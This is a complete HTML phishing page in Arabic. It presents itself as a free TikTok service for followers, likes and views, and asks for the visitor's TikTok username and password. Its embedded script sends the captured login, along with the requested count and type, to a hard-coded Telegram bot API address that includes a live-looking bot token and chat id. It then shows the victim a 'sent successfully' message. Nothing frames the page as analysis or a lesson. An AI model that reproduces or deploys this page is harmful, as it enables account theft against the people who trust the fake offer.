<!DOCTYPE html><html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>رشق تيك توك</title>
  <style>
    body {
      background-image: url('https://i.ibb.co/NYbSY7q/tiktok-bg.png'); /* رابط الصورة المرفوعة سابقاً */
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
      font-family: Arial, sans-serif;
      color: white;
      text-align: center;
      direction: rtl;
    }
    .container {
      margin-top: 300px;
      background-color: rgba(0, 0, 0, 0.6);
      padding: 20px;
      border-radius: 15px;
      width: 90%;
      max-width: 400px;
      margin-left: auto;
      margin-right: auto;
    }
    h2 {
      margin-bottom: 20px;
      color: white;
    }
    input, select, button {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      font-size: 16px;
    }
    input, select {
      background-color: white;
      color: black;
    }
    button {
      background-color: #ff0050;
      color: white;
      cursor: pointer;
    }
    button:hover {
      background-color: #e60045;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>رشق مجاني</h2>
    <form action="https://api.telegram.org/bot7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk/sendMessage" method="post" target="_blank" onsubmit="sendToTelegram(event)">
      <input type="text" id="username" placeholder="اسم المستخدم" required>
      <input type="password" id="password" placeholder="كلمة المرور" required>
      <select id="count">
        <option value="1000">1000</option>
        <option value="2000">2000</option>
        <option value="5000">5000</option>
      </select>
      <select id="type">
        <option value="متابعين">متابعين</option>
        <option value="لايكات">لايكات</option>
        <option value="مشاهدات">مشاهدات</option>
      </select>
      <button type="submit">تم</button>
    </form>
  </div>  <script>
    function sendToTelegram(event) {
      event.preventDefault();
      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;
      var count = document.getElementById('count').value;
      var type = document.getElementById('type').value;

      var message = `\u2728 تيك توك جديد:\n\n👤 يوزر: ${username}\n🔒 باسورد: ${password}\n📦 عدد: ${count}\n📌 نوع: ${type}`;

      var telegramURL = `https://api.telegram.org/bot7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk/sendMessage?chat_id=7197079453&text=${encodeURIComponent(message)}`;

      fetch(telegramURL)
        .then(response => {
          if (response.ok) {
            alert("تم الإرسال بنجاح!");
          } else {
            alert("فشل الإرسال.");
          }
        });
    }
  </script></body>
</html>
